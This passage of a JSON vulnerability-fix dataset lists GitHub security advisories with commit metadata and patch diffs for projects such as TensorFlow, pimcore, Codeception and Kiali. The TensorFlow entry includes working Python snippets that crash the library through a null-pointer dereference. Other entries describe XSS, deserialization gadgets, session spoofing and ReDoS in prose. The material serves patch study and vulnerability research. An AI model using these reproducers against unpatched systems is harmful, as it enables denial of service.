\\t}\\n-\\n-\\t\/\/ The call to idRand.Uint32 must be within the\\n-\\t\/\/ mutex lock because *rand.Rand is not safe for\\n-\\t\/\/ concurrent use.\\n-\\t\/\/\\n-\\t\/\/ There is no added performance overhead to calling\\n-\\t\/\/ idRand.Uint32 inside a mutex lock over just\\n-\\t\/\/ calling rand.Uint32 as the global math\/rand rng\\n-\\t\/\/ is internally protected by a sync.Mutex.\\n-\\tid := uint16(idRand.Uint32())\\n-\\n-\\tidLock.Unlock()\\n-\\treturn id\\n+\\treturn output\\n }\\n \\n \/\/ MsgHdr is a a manually-unpacked version of (id, bits).'}}","message_norm":"use crypto\/rand for random id generation. (#1044)\n\n* use crypto\/rand for random id generation.\r\n\r\nfixes #1043 and #1037\r\n\r\n* panic on rare crypto\/rand error.\r\n\r\n* fixes in response to review.","language":"en","entities":"[('crypto', 'SECWORD', ''), ('#1044', 'ISSUE', ''), ('crypto', 'SECWORD', ''), ('fixes', 'ACTION', ''), ('#1043', 'ISSUE', ''), ('#1037', 'ISSUE', ''), ('crypto', 'SECWORD', ''), ('error', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['msg.go'])","num_files":1.0},{"index":360,"vuln_id":"GHSA-452g-f7fp-9jf7","cwe_id":"{'CWE-476'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/030af767d357d1b4088c4a25c72cb3906abac489'}","dataset":"osv","summary":"Type confusion during tensor casts lead to dereferencing null pointers ### Impact\nCalling TF operations with tensors of non-numeric types when the operations expect numeric tensors result in null pointer dereferences.\n\nThere are multiple ways to reproduce this, listing a few examples here:\n\n```python\nimport tensorflow as tf\nimport numpy as np\ndata = tf.random.truncated_normal(shape=1,mean=np.float32(20.8739),stddev=779.973,dtype=20,seed=64)\n```\n\n```python\nimport tensorflow as tf\nimport numpy as np\ndata =\ntf.random.stateless_truncated_normal(shape=1,seed=[63,70],mean=np.float32(20.8739),stddev=779.973,dtype=20)\n```\n\n```python\nimport tensorflow as tf\nimport numpy as np\ndata = tf.one_hot(indices=[62,50],depth=136,on_value=np.int32(237),off_value=158,axis=856,dtype=20)\n```\n\n```python\nimport tensorflow as tf\nimport numpy as np\ndata = tf.range(start=np.int32(214),limit=660,delta=129,dtype=20)\n```\n\n```python\nimport tensorflow as tf\nimport numpy as np\ndata = tf.raw_ops.ResourceCountUpTo(resource=np.int32(30), limit=872, T=3)\n```\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\nwriter_array = np.array([1,2],dtype=np.int32)\nwriter_tensor = tf.convert_to_tensor(writer_array,dtype=tf.resource)\n```\n\nAll these examples and similar ones have the same behavior: the [conversion from Python array to C++ array](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/ff70c47a396ef1e3cb73c90513da4f5cb71bebba\/tensorflow\/python\/lib\/core\/ndarray_tensor.cc#L113-L169) is vulnerable to a type confusion:\n\n```cc\n  int pyarray_type = PyArray_TYPE(array);\n  PyArray_Descr* descr = PyArray_DESCR(array);\n  switch (pyarray_type) {\n    ...\n    case NPY_VOID:\n      \/\/ Quantized types are currently represented as custom struct types.\n      \/\/ PyArray_TYPE returns NPY_VOID for structs, and we should look into\n      \/\/ descr to derive the actual type.\n      \/\/ Direct feeds of certain types of ResourceHandles are represented as a\n      \/\/ custom struct type.\n      return PyArrayDescr_to_TF_DataType(descr, out_tf_datatype);\n    ...\n  }\n```\n\nFor the tensor types involved in the above example, the `pyarray_type` is `NPY_VOID` but the `descr` field is such that `descr->field = NULL`. Then [`PyArrayDescr_to_TF_DataType`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/ff70c47a396ef1e3cb73c90513da4f5cb71bebba\/tensorflow\/python\/lib\/core\/ndarray_tensor.cc#L72-L77) will trigger a null dereference:\n\n```cc\nStatus PyArrayDescr_to_TF_DataType(PyArray_Descr* descr,\n                                   TF_DataType* out_tf_datatype) {\n  PyObject* key;\n  PyObject* value;\n  Py_ssize_t pos = 0;\n  if (PyDict_Next(descr->fields, &pos, &key, &value)) {\n    ...\n  }\n}\n```\n\nThis is because the Python's `PyDict_Next` implementation would dereference the first argument.\n\n### Patches\nWe have patched the issue in GitHub commit [030af767d357d1b4088c4a25c72cb3906abac489](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/030af767d357d1b4088c4a25c72cb3906abac489).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360 as well as Ye Zhang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/030af767d357d1b4088c4a25c72cb3906abac489","commit_sha":"030af767d357d1b4088c4a25c72cb3906abac489","patch":"SINGLE","chain_ord":"['030af767d357d1b4088c4a25c72cb3906abac489']","before_first_fix_commit":"{'ff70c47a396ef1e3cb73c90513da4f5cb71bebba'}","last_fix_commit":"030af767d357d1b4088c4a25c72cb3906abac489","chain_ord_pos":1.0,"commit_datetime":"04\/13\/2021, 21:25:01","message":"Fix `tf.raw_ops.ResourceCountUpTo` null pointer dereference.\n\nPiperOrigin-RevId: 368294347\nChange-Id: I2c16fbfc9b4966c402c3d8e311f0d665a9c852d8","author":"Amit Patankar","comments":null,"stats":"{'additions': 8, 'deletions': 0, 'total': 8}","files":"{'tensorflow\/python\/lib\/core\/ndarray_tensor.cc': {'additions': 8, 'deletions': 0, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/030af767d357d1b4088c4a25c72cb3906abac489\/tensorflow%2Fpython%2Flib%2Fcore%2Fndarray_tensor.cc', 'patch': '@@ -16,6 +16,7 @@ limitations under the License.\\n #include \"tensorflow\/python\/lib\/core\/ndarray_tensor.h\"\\n \\n #include <cstring>\\n+#include <optional>\\n \\n #include \"tensorflow\/c\/eager\/tfe_context_internal.h\"\\n #include \"tensorflow\/c\/tf_tensor_internal.h\"\\n@@ -74,6 +75,13 @@ Status PyArrayDescr_to_TF_DataType(PyArray_Descr* descr,\\n   PyObject* key;\\n   PyObject* value;\\n   Py_ssize_t pos = 0;\\n+\\n+  \/\/ Return an error if the fields attribute is null.\\n+  \/\/ Occurs with an improper conversion attempt to resource.\\n+  if (descr->fields == nullptr) {\\n+    return errors::Internal(\"Unexpected numpy data type\");\\n+  }\\n+\\n   if (PyDict_Next(descr->fields, &pos, &key, &value)) {\\n     \/\/ In Python 3, the keys of numpy custom struct types are unicode, unlike\\n     \/\/ Python 2, where the keys are bytes.'}}","message_norm":"fix `tf.raw_ops.resourcecountupto` null pointer dereference.\n\npiperorigin-revid: 368294347\nchange-id: i2c16fbfc9b4966c402c3d8e311f0d665a9c852d8","language":"en","entities":"[('fix', 'ACTION', ''), ('null pointer dereference', 'SECWORD', ''), ('368294347', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/python\/lib\/core\/ndarray_tensor.cc'])","num_files":1.0},{"index":361,"vuln_id":"GHSA-455w-gv5p-wgg3","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/pimcore\/pimcore\/commit\/665976327ad3c2c87efa2a5a64d696032c0a8109'}","dataset":"osv","summary":"Cross-site Scripting in pimcore pimcore is vulnerable to Stored XSS at Name field in the setting tab of the Global Targeting Rules.","published_date":"2022-01-26","chain_len":1,"project":"https:\/\/github.com\/pimcore\/pimcore","commit_href":"https:\/\/github.com\/pimcore\/pimcore\/commit\/665976327ad3c2c87efa2a5a64d696032c0a8109","commit_sha":"665976327ad3c2c87efa2a5a64d696032c0a8109","patch":"SINGLE","chain_ord":"['665976327ad3c2c87efa2a5a64d696032c0a8109']","before_first_fix_commit":"{'7f8855719f56c42ee3eda27a84b38ab57890e144'}","last_fix_commit":"665976327ad3c2c87efa2a5a64d696032c0a8109","chain_ord_pos":1.0,"commit_datetime":"01\/19\/2022, 10:36:40","message":"[Targeting] Escape\/validate names of rules properly (#11205)\n\n* [Targeting] Escape\/validate names of rules properly\r\n\r\n* Update bundles\/AdminBundle\/Controller\/Admin\/TargetingController.php\r\n\r\nCo-authored-by: Jacob Dreesen <j.dreesen@neusta.de>\r\n\r\nCo-authored-by: Jacob Dreesen <j.dreesen@neusta.de>","author":"Bernhard Rusch","comments":null,"stats":"{'additions': 11, 'deletions': 4, 'total': 15}","files":"{'bundles\/AdminBundle\/Controller\/Admin\/TargetingController.php': {'additions': 11, 'deletions': 4, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pimcore\/pimcore\/raw\/665976327ad3c2c87efa2a5a64d696032c0a8109\/bundles%2FAdminBundle%2FController%2FAdmin%2FTargetingController.php', 'patch': '@@ -37,6 +37,11 @@ class TargetingController extends AdminController implements KernelControllerEve\\n {\\n     \/\/ RULES\\n \\n+    private function correctName(string $name): string\\n+    {\\n+        return preg_replace(\\'\/[#?*:\\\\\\\\\\\\\\\\<>|\"%&@=;+]\/\\', \\'-\\', $name);\\n+    }\\n+\\n     \/**\\n      * @Route(\"\/rule\/list\", name=\"pimcore_admin_targeting_rulelist\", methods={\"GET\"})\\n      *\\n@@ -55,7 +60,7 @@ public function ruleListAction(Request $request)\\n         foreach ($list->load() as $target) {\\n             $targets[] = [\\n                 \\'id\\' => $target->getId(),\\n-                \\'text\\' => $target->getName(),\\n+                \\'text\\' => htmlspecialchars($target->getName()),\\n                 \\'active\\' => $target->getActive(),\\n                 \\'qtip\\' => \\'ID: \\' . $target->getId(),\\n             ];\\n@@ -74,7 +79,7 @@ public function ruleListAction(Request $request)\\n     public function ruleAddAction(Request $request)\\n     {\\n         $target = new Targeting\\\\Rule();\\n-        $target->setName($request->get(\\'name\\'));\\n+        $target->setName($this->correctName($request->get(\\'name\\')));\\n         $target->save();\\n \\n         return $this->adminJson([\\'success\\' => true, \\'id\\' => $target->getId()]);\\n@@ -129,6 +134,7 @@ public function ruleSaveAction(Request $request)\\n         \/** @var Targeting\\\\Rule|Targeting\\\\Rule\\\\Dao $target *\/\\n         $target = Targeting\\\\Rule::getById($request->get(\\'id\\'));\\n         $target->setValues($data[\\'settings\\']);\\n+        $target->setName($this->correctName($target->getName()));\\n         $target->setConditions($data[\\'conditions\\']);\\n         $target->setActions($data[\\'actions\\']);\\n         $target->save();\\n@@ -208,7 +214,7 @@ public function targetGroupListAction(Request $request)\\n         foreach ($list->load() as $targetGroup) {\\n             $targetGroups[] = [\\n                 \\'id\\' => $targetGroup->getId(),\\n-                \\'text\\' => $targetGroup->getName(),\\n+                \\'text\\' => htmlspecialchars($targetGroup->getName()),\\n                 \\'active\\' => $targetGroup->getActive(),\\n                 \\'qtip\\' => $targetGroup->getId(),\\n             ];\\n@@ -230,7 +236,7 @@ public function targetGroupAddAction(Request $request, CoreCacheHandler $cache,\\n     {\\n         \/** @var TargetGroup|TargetGroup\\\\Dao $targetGroup *\/\\n         $targetGroup = new TargetGroup();\\n-        $targetGroup->setName($request->get(\\'name\\'));\\n+        $targetGroup->setName($this->correctName($request->get(\\'name\\')));\\n         $targetGroup->save();\\n \\n         $event = new TargetGroupEvent($targetGroup);\\n@@ -300,6 +306,7 @@ public function targetGroupSaveAction(Request $request, CoreCacheHandler $cache,\\n         \/** @var TargetGroup|TargetGroup\\\\Dao $targetGroup *\/\\n         $targetGroup = TargetGroup::getById($request->get(\\'id\\'));\\n         $targetGroup->setValues($data[\\'settings\\']);\\n+        $targetGroup->setName($this->correctName($targetGroup->getName()));\\n         $targetGroup->save();\\n \\n         $event = new TargetGroupEvent($targetGroup);'}}","message_norm":"[targeting] escape\/validate names of rules properly (#11205)\n\n* [targeting] escape\/validate names of rules properly\r\n\r\n* update bundles\/adminbundle\/controller\/admin\/targetingcontroller.php\r\n\r\nco-authored-by: jacob dreesen <j.dreesen@neusta.de>\r\n\r\nco-authored-by: jacob dreesen <j.dreesen@neusta.de>","language":"en","entities":"[('escape', 'SECWORD', ''), ('validate', 'ACTION', ''), ('#11205', 'ISSUE', ''), ('escape', 'SECWORD', ''), ('validate', 'ACTION', ''), ('update', 'ACTION', ''), ('adminbundle', 'SECWORD', ''), ('admin', 'SECWORD', ''), ('j.dreesen@neusta.de', 'EMAIL', ''), ('j.dreesen@neusta.de', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['bundles\/AdminBundle\/Controller\/Admin\/TargetingController.php'])","num_files":1.0},{"index":362,"vuln_id":"GHSA-4574-qv3w-fcmg","cwe_id":"{'CWE-502'}","score":9.8,"chain":"{'https:\/\/github.com\/Codeception\/Codeception\/commit\/cbce9ea7f4664052fa1ac6b36f5b5a6dbd864d71', 'https:\/\/github.com\/Codeception\/Codeception\/commit\/802a108057d250ee563120eaa5365a519afc0a71'}","dataset":"osv","summary":" Deserialization of Untrusted Data in codeception\/codeception This affects the package codeception\/codeception from 4.0.0 before 4.1.22 and before 3.1.3. The RunProcess class can be leveraged as a gadget to run arbitrary commands on a system that is deserializing user input without validation.","published_date":"2021-09-01","chain_len":2,"project":"https:\/\/github.com\/Codeception\/Codeception","commit_href":"https:\/\/github.com\/Codeception\/Codeception\/commit\/cbce9ea7f4664052fa1ac6b36f5b5a6dbd864d71","commit_sha":"cbce9ea7f4664052fa1ac6b36f5b5a6dbd864d71","patch":"MULTI","chain_ord":"['cbce9ea7f4664052fa1ac6b36f5b5a6dbd864d71', '802a108057d250ee563120eaa5365a519afc0a71']","before_first_fix_commit":"{'5ea172de7b1b2e61dcdd50d73f8368886c549fb4'}","last_fix_commit":"802a108057d250ee563120eaa5365a519afc0a71","chain_ord_pos":1.0,"commit_datetime":"08\/06\/2021, 07:46:35","message":"Security: Disable deserialization of RunProcess class (#6241)","author":"Gintautas Miselis","comments":null,"stats":"{'additions': 22, 'deletions': 0, 'total': 22}","files":"{'ext\/RunProcess.php': {'additions': 22, 'deletions': 0, 'changes': 22, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Codeception\/Codeception\/raw\/cbce9ea7f4664052fa1ac6b36f5b5a6dbd864d71\/ext%2FRunProcess.php', 'patch': \"@@ -107,4 +107,26 @@ public function stopProcess()\\n         }\\n         $this->processes = [];\\n     }\\n+\\n+    \/**\\n+     * Disable the deserialization of the class to prevent attacker executing\\n+     * code by leveraging the __destruct method.\\n+     *\\n+     * @see https:\/\/owasp.org\/www-community\/vulnerabilities\/PHP_Object_Injection\\n+     *\/\\n+    public function __sleep()\\n+    {\\n+        throw new \\\\BadMethodCallException('Cannot serialize ' . __CLASS__);\\n+    }\\n+\\n+    \/**\\n+     * Disable the deserialization of the class to prevent attacker executing\\n+     * code by leveraging the __destruct method.\\n+     *\\n+     * @see https:\/\/owasp.org\/www-community\/vulnerabilities\/PHP_Object_Injection\\n+     *\/\\n+    public function __wakeup()\\n+    {\\n+        throw new \\\\BadMethodCallException('Cannot unserialize ' . __CLASS__);\\n+    }\\n }\"}}","message_norm":"security: disable deserialization of runprocess class (#6241)","language":"en","entities":"[('security', 'SECWORD', ''), ('deserialization', 'SECWORD', ''), ('#6241', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['ext\/RunProcess.php'])","num_files":1.0},{"index":367,"vuln_id":"GHSA-465w-gg5p-85c9","cwe_id":"{'CWE-613', 'CWE-384', 'CWE-295'}","score":8.6,"chain":"{'https:\/\/github.com\/kiali\/kiali\/commit\/93f5cd0b6698e8fe8772afb8f35816f6c086aef1', 'https:\/\/github.com\/kiali\/kiali\/commit\/c91a0949683976f621cca213c1193831d63b381c'}","dataset":"osv","summary":"Insufficient Session Expiration in Kiali An insufficient JWT validation vulnerability was found in Kiali versions 0.4.0 to 1.15.0 and was fixed in Kiali version 1.15.1, wherein a remote attacker could abuse this flaw by stealing a valid JWT cookie and using that to spoof a user session, possibly gaining privileges to view and alter the Istio configuration.","published_date":"2021-05-18","chain_len":2,"project":"https:\/\/github.com\/kiali\/kiali","commit_href":"https:\/\/github.com\/kiali\/kiali\/commit\/c91a0949683976f621cca213c1193831d63b381c","commit_sha":"c91a0949683976f621cca213c1193831d63b381c","patch":"MULTI","chain_ord":"['c91a0949683976f621cca213c1193831d63b381c', '93f5cd0b6698e8fe8772afb8f35816f6c086aef1']","before_first_fix_commit":"{'a660a80b2add1fd2fcfb5662c63824ca1dff95b9'}","last_fix_commit":"93f5cd0b6698e8fe8772afb8f35816f6c086aef1","chain_ord_pos":1.0,"commit_datetime":"03\/17\/2020, 18:05:17","message":"Fix security issues around 'token' strategy\n\n* Require presence of sid claim","author":"Edgar Hern\u00e1ndez","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'handlers\/authentication.go': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/kiali\/kiali\/raw\/c91a0949683976f621cca213c1193831d63b381c\/handlers%2Fauthentication.go', 'patch': '@@ -425,6 +425,12 @@ func checkTokenSession(w http.ResponseWriter, r *http.Request) (int, string) {\\n \\tif claims, err := config.GetTokenClaimsIfValid(tokenString); err != nil {\\n \\t\\tlog.Warningf(\"Token is invalid: %s\", err.Error())\\n \\t} else {\\n+\\t\\t\/\/ Session ID claim must be present\\n+\\t\\tif len(claims.SessionId) == 0 {\\n+\\t\\t\\tlog.Warning(\"Token is invalid: sid claim is required\")\\n+\\t\\t\\treturn http.StatusUnauthorized, \"\"\\n+\\t\\t}\\n+\\n \\t\\tbusiness, err := business.Get(claims.SessionId)\\n \\t\\tif err != nil {\\n \\t\\t\\tlog.Warning(\"Could not get the business layer : \", err)'}}","message_norm":"fix security issues around 'token' strategy\n\n* require presence of sid claim","language":"en","entities":"[('fix', 'ACTION', ''), ('security', 'SECWORD', ''), ('issues', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['handlers\/authentication.go'])","num_files":1.0},{"index":368,"vuln_id":"GHSA-468q-v4jj-485h","cwe_id":"{'CWE-1333'}","score":7.5,"chain":"{'https:\/\/github.com\/nervjs\/taro\/commit\/acadb6c826ba57f2030a626f1de4f7b4608fcdb5'}","dataset":"osv","summary":"Inefficient Regular Expression Complexity in taro taro is vulnerable to Inefficient Regular Expression Complexity","published_date":"2021-09-20","chain_len":1,"project":"https:\/\/github.com\/nervjs\/taro","commit_href":"https:\/\/github.com\/nervjs\/taro\/commit\/acadb6c826ba57f2030a626f1de4f7b4608fcdb5","commit_sha":"acadb6c826ba57f2030a626f1de4f7b4608fcdb5","patch":"SINGLE","chain_ord":"['acadb6c826ba57f2030a626f1de4f7b4608fcdb5']","before_first_fix_commit":"{'51a672907177558f20d664e7c196fdb0bff41c75'}","last_fix_commit":"acadb6c826ba57f2030a626f1de4f7b4608fcdb5","chain_ord_pos":1.0,"commit_datetime":"09\/02\/2021, 14:08:46","message":"Security fix for ReDoS\n\nFixed Regular Expression Denial of Service vulnerability in url validation","author":"ready-research","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'packages\/taro-helper\/src\/constants.ts': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/NervJS\/taro\/raw\/acadb6c826ba57f2030a626f1de4f7b4608fcdb5\/packages%2Ftaro-helper%2Fsrc%2Fconstants.ts', 'patch': '@@ -104,7 +104,7 @@ export const REG_JSON = \/\\\\.json(\\\\?.*)?$\/\\n export const REG_UX = \/\\\\.ux(\\\\?.*)?$\/\\n export const REG_TEMPLATE = \/\\\\.(wxml|axml|ttml|qml|swan|jxml)(\\\\?.*)?$\/\\n export const REG_WXML_IMPORT = \/<import(.*)?src=(?:(?:\\'([^\\']*)\\')|(?:\"([^\"]*)\"))\/gi\\n-export const REG_URL = \/^(?:(?:(?:https?|ftp):)?\\\\\/\\\\\/)(?:\\\\S+(?::\\\\S*)?@)?(?:(?!(?:10|127)(?:\\\\.\\\\d{1,3}){3})(?!(?:169\\\\.254|192\\\\.168)(?:\\\\.\\\\d{1,3}){2})(?!172\\\\.(?:1[6-9]|2\\\\d|3[0-1])(?:\\\\.\\\\d{1,3}){2})(?:[1-9]\\\\d?|1\\\\d\\\\d|2[01]\\\\d|22[0-3])(?:\\\\.(?:1?\\\\d{1,2}|2[0-4]\\\\d|25[0-5])){2}(?:\\\\.(?:[1-9]\\\\d?|1\\\\d\\\\d|2[0-4]\\\\d|25[0-4]))|(?:(?:[a-z\\\\u00a1-\\\\uffff0-9]-*)*[a-z\\\\u00a1-\\\\uffff0-9]+)(?:\\\\.(?:[a-z\\\\u00a1-\\\\uffff0-9]-*)*[a-z\\\\u00a1-\\\\uffff0-9]+)*(?:\\\\.(?:[a-z\\\\u00a1-\\\\uffff]{2,}))\\\\.?)(?::\\\\d{2,5})?(?:[\/?#]\\\\S*)?$\/i\\n+export const REG_URL = \/^(?:(?:(?:https?|ftp):)?\\\\\/\\\\\/)(?:\\\\S+(?::\\\\S*)?@)?(?:(?!(?:10|127)(?:\\\\.\\\\d{1,3}){3})(?!(?:169\\\\.254|192\\\\.168)(?:\\\\.\\\\d{1,3}){2})(?!172\\\\.(?:1[6-9]|2\\\\d|3[0-1])(?:\\\\.\\\\d{1,3}){2})(?:[1-9]\\\\d?|1\\\\d\\\\d|2[01]\\\\d|22[0-3])(?:\\\\.(?:1?\\\\d{1,2}|2[0-4]\\\\d|25[0-5])){2}(?:\\\\.(?:[1-9]\\\\d?|1\\\\d\\\\d|2[0-4]\\\\d|25[0-4]))|(?:(?:[a-z0-9\\\\u00a1-\\\\uffff][a-z0-9\\\\u00a1-\\\\uffff_-]{0,62})?[a-z0-9\\\\u00a1-\\\\uffff]\\\\.)+(?:[a-z\\\\u00a1-\\\\uffff]{2,}\\\\.?))(?::\\\\d{2,5})?(?:[\/?#]\\\\S*)?$\/i\\n export const CSS_IMPORT_REG = \/@import ([\"\\'])(.+?)\\\\1;\/g\\n \\n export const NODE_MODULES = \\'node_modules\\''}}","message_norm":"security fix for redos\n\nfixed regular expression denial of service vulnerability in url validation","language":"en","entities":"[('security', 'SECWORD', ''), ('redos', 'SECWORD', ''), ('fixed', 'ACTION', ''), ('denial of service', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('url validation', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['packages\/taro-helper\/src\/constants.ts'])","num_files":1.0},{"index":369,"vuln_id":"GHSA-46c5-pfj8-fv65","cwe_id":"{'CWE-704'}","score":7.5,"chain":"{'https:\/\/github.com\/pmmp\/PocketMine-MP\/commit\/c8e1cfcbee4945fd4b63d2a7e96025c59744d4f1'}","dataset":"osv","summary":"Improperly checked metadata on tools\/armour itemstacks received from the client ### Impact\nDue to a workaround applied in 1.13, an attacker may send a negative damage\/meta value in a tool or armour item's NBT, which `TypeConverter` then blindly uses as if it was valid without being checked.\n\nWhen this invalid metadata value reaches `Durable->setDamage()`, an exception is thrown because the metadata is not within the expected range for damage values.\n\nThis can be reproduced with either a too-large damage value, or a negative one.\n\n### Patches\nc8e1cfcbee4945fd4b63d2a7e96025c59744d4f1\n\n### Workarounds\nIn theory this can be checked by plugins using a custom `TypeConverter`, but this is likely to be very cumbersome.\n\n### For more information\n* Email us at [team@pmmp.io](mailto:team@pmmp.io)","published_date":"2022-03-18","chain_len":1,"project":"https:\/\/github.com\/pmmp\/PocketMine-MP","commit_href":"https:\/\/github.com\/pmmp\/PocketMine-MP\/commit\/c8e1cfcbee4945fd4b63d2a7e96025c59744d4f1","commit_sha":"c8e1cfcbee4945fd4b63d2a7e96025c59744d4f1","patch":"SINGLE","chain_ord":"['c8e1cfcbee4945fd4b63d2a7e96025c59744d4f1']","before_first_fix_commit":"{'869dda9a45a12028243cae590552458ce970ec18'}","last_fix_commit":"c8e1cfcbee4945fd4b63d2a7e96025c59744d4f1","chain_ord_pos":1.0,"commit_datetime":"03\/15\/2022, 23:44:41","message":"TypeConverter: account for possible out-of-range meta in items","author":"Dylan K. Taylor","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'src\/network\/mcpe\/convert\/TypeConverter.php': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pmmp\/PocketMine-MP\/raw\/c8e1cfcbee4945fd4b63d2a7e96025c59744d4f1\/src%2Fnetwork%2Fmcpe%2Fconvert%2FTypeConverter.php', 'patch': '@@ -232,6 +232,9 @@ public function netItemStackToCore(ItemStack $itemStack) : Item{\\n \\t\\t\\t\\t$compound = null;\\n \\t\\t\\t}\\n \\t\\t}\\n+\\t\\tif($meta < 0 || $meta >= 0x7fff){ \/\/this meta value may have been restored from the NBT\\n+\\t\\t\\tthrow new TypeConversionException(\"Item meta must be in range 0 ... \" . 0x7fff . \" (received $meta)\");\\n+\\t\\t}\\n \\n \\t\\ttry{\\n \\t\\t\\treturn ItemFactory::getInstance()->get('}}","message_norm":"typeconverter: account for possible out-of-range meta in items","language":"en","entities":"[('out-of-range', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/network\/mcpe\/convert\/TypeConverter.php'])","num_files":1.0},{"index":371,"vuln_id":"GHSA-46hv-7769-j7rx","cwe_id":"{'CWE-548'}","score":0.0,"chain":"{'https:\/\/github.com\/sintaxi\/harp\/commit\/1ec790baeeb2bfdb4584f1998af3d10a8fa31210'}","dataset":"osv","summary":"Unauthorized File Access in harp Affected versions of `harp` are vulnerable to Unauthorized File Access. The package states that it ignores files and directories with names that start with an underscore, such as `_secret-folder`. If the underscore character is URL encoded the server delivers the file.\n\n## Recommendation\n\nUpgrade to version `0.40.2` or later.","published_date":"2019-06-13","chain_len":1,"project":"https:\/\/github.com\/sintaxi\/harp","commit_href":"https:\/\/github.com\/sintaxi\/harp\/commit\/1ec790baeeb2bfdb4584f1998af3d10a8fa31210","commit_sha":"1ec790baeeb2bfdb4584f1998af3d10a8fa31210","patch":"SINGLE","chain_ord":"['1ec790baeeb2bfdb4584f1998af3d10a8fa31210']","before_first_fix_commit":"{'d3f7ba27c7554251a91f2987d702a6d4cfe8f081'}","last_fix_commit":"1ec790baeeb2bfdb4584f1998af3d10a8fa31210","chain_ord_pos":1.0,"commit_datetime":"06\/02\/2021, 18:56:59","message":"Resolves serving private file via encoded underscore. #646","author":"Brock Whitten","comments":null,"stats":"{'additions': 867, 'deletions': 1027, 'total': 1894}","files":"{'package-lock.json': {'additions': 867, 'deletions': 1027, 'changes': 1894, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/sintaxi\/harp\/raw\/1ec790baeeb2bfdb4584f1998af3d10a8fa31210\/package-lock.json', 'patch': None}}","message_norm":"resolves serving private file via encoded underscore. #646","language":"it","entities":"[('private file', 'SECWORD', ''), ('encoded', 'SECWORD', ''), ('#646', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['package-lock.json'])","num_files":1.0},{"index":378,"vuln_id":"GHSA-47vg-483w-hp3m","cwe_id":"{'CWE-384'}","score":4.3,"chain":"{'https:\/\/github.com\/filegator\/filegator\/commit\/fcd3995f64f5dfc6a4c2c059cc22a2fef1e81225'}","dataset":"osv","summary":"Improper user session handling in filegator FileGator prior to version 7.8.0 is vulnerable to session fixation.","published_date":"2022-05-25","chain_len":1,"project":"https:\/\/github.com\/filegator\/filegator","commit_href":"https:\/\/github.com\/filegator\/filegator\/commit\/fcd3995f64f5dfc6a4c2c059cc22a2fef1e81225","commit_sha":"fcd3995f64f5dfc6a4c2c059cc22a2fef1e81225","patch":"SINGLE","chain_ord":"['fcd3995f64f5dfc6a4c2c059cc22a2fef1e81225']","before_first_fix_commit":"{'6e2b68f17f48cdc1d6a4a93a2369d2069fe64989'}","last_fix_commit":"fcd3995f64f5dfc6a4c2c059cc22a2fef1e81225","chain_ord_pos":1.0,"commit_datetime":"05\/24\/2022, 11:08:43","message":"regenerate session on user update","author":"Milos Stojanovic","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'backend\/Services\/Auth\/Adapters\/JsonFile.php': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/filegator\/filegator\/raw\/fcd3995f64f5dfc6a4c2c059cc22a2fef1e81225\/backend%2FServices%2FAuth%2FAdapters%2FJsonFile.php', 'patch': \"@@ -53,7 +53,7 @@ public function user(): ?User\\n \\n         if ($user) {\\n             foreach ($this->getUsers() as $u) {\\n-                if ($u['username'] == $user->getUsername() && $hash == $u['password']) {\\n+                if ($u['username'] == $user->getUsername() && $hash == $u['password'].$u['permissions'].$u['homedir'].$u['role']) {\\n                     return $user;\\n                 }\\n             }\\n@@ -70,7 +70,7 @@ public function authenticate($username, $password): bool\\n             if ($u['username'] == $username && $this->verifyPassword($password, $u['password'])) {\\n                 $user = $this->mapToUserObject($u);\\n                 $this->store($user);\\n-                $this->session->set(self::SESSION_HASH, $u['password']);\\n+                $this->session->set(self::SESSION_HASH, $u['password'].$u['permissions'].$u['homedir'].$u['role']);\\n \\n                 return true;\\n             }\"}}","message_norm":"regenerate session on user 